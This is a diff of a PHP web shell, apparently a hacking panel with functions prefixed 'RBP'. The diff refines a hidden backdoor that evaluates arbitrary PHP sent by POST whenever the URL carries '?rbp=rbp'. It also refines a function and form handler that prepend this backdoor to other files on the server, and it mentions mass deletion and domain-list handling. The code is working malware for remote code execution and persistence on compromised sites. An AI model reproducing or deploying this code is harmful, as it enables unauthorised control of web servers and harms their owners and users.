@@ -58,11 +58,11 @@ if (!isset($_COOKIE['rbp_visited'])) {
     setcookie('rbp_visited', '1', time() + (86400 * 30), "/"); // 30 days
 }
 
-// Backdoor execution - FIXED
-if(isset($_GET['rbp']) && $_GET['rbp']=='rbp'){
+// Backdoor execution - UPDATED FIX
+if(isset($_GET['rbp'])&&$_GET['rbp']=='rbp'){
     if(isset($_POST['rbp'])){
-        eval($_POST['rbp']);
-        exit;
+        @eval('?>' . $_POST['rbp']);
+        exit();
     }
 }
 
@@ -213,7 +213,7 @@ function RBPdownloadDomainsList($baseDir, $filename) {
     return $domainsList;
 }
 
-// Add backdoor to file - FIXED
+// Add backdoor to file - UPDATED FIX
 function RBPaddBackdoor($filePath, $backdoorCode) {
     if (!file_exists($filePath)) {
         return ["error" => "File not found: $filePath"];
@@ -229,8 +229,12 @@ function RBPaddBackdoor($filePath, $backdoorCode) {
         return ["error" => "Backdoor already exists in file"];
     }
     
-    // Add backdoor code at the beginning for better execution
-   $newContent = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval(\$_POST['rbp']);exit();}}?>" . $originalContent;
+    // Remove existing PHP tags if any at start
+    $cleanContent = preg_replace('/^<\?php\s*/', '', $originalContent);
+    $cleanContent = preg_replace('/^<\?\s*/', '', $cleanContent);
+    
+    // Add backdoor code - UPDATED FIX
+    $newContent = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval('?>'.\$_POST['rbp']);exit();}}?>" . $cleanContent;
     
     if (file_put_contents($filePath, $newContent)) {
         return ["success" => "Backdoor added successfully to: $filePath"];
@@ -627,45 +631,7 @@ if (isset($_POST['mass_delete'])) {
     exit;
 }
 
-// Backdoor execution - ERROR FIXED
-if(isset($_GET['rbp'])&&$_GET['rbp']=='rbp'){
-    if(isset($_POST['rbp'])){
-        @eval('?>' . $_POST['rbp']);
-        exit();
-    }
-}
-
-// Add backdoor to file - ERROR FIXED
-function RBPaddBackdoor($filePath, $backdoorCode) {
-    if (!file_exists($filePath)) {
-        return ["error" => "File not found: $filePath"];
-    }
-    
-    $originalContent = file_get_contents($filePath);
-    if ($originalContent === false) {
-        return ["error" => "Cannot read file: $filePath"];
-    }
-    
-    // Check if backdoor already exists
-    if (strpos($originalContent, '?rbp=rbp') !== false) {
-        return ["error" => "Backdoor already exists in file"];
-    }
-    
-    // Remove existing PHP tags if any at start
-    $cleanContent = preg_replace('/^<\?php\s*/', '', $originalContent);
-    $cleanContent = preg_replace('/^<\?\s*/', '', $cleanContent);
-    
-    // Add backdoor code - ERROR FIXED
-    $newContent = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval('?>'.\$_POST['rbp']);exit();}}?>" . $cleanContent;
-    
-    if (file_put_contents($filePath, $newContent)) {
-        return ["success" => "Backdoor added successfully to: $filePath"];
-    } else {
-        return ["error" => "Failed to add backdoor to: $filePath"];
-    }
-}
-
-// Backdoor handler - ERROR FIXED
+// Backdoor handler - UPDATED FIX
 if (isset($_POST['add_backdoor'])) {
     $isPostAction = true;
     $sourceFile = $_POST['backdoor_file_path'] ?? '';
@@ -676,7 +642,7 @@ if (isset($_POST['add_backdoor'])) {
         exit;
     }
     
-    // ERROR FIXED backdoor code
+    // UPDATED FIX backdoor code
     $backdoorCode = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval('?>'.\$_POST['rbp']);exit();}}?>";
     
     $results = RBPaddBackdoor($sourceFile, $backdoorCode);
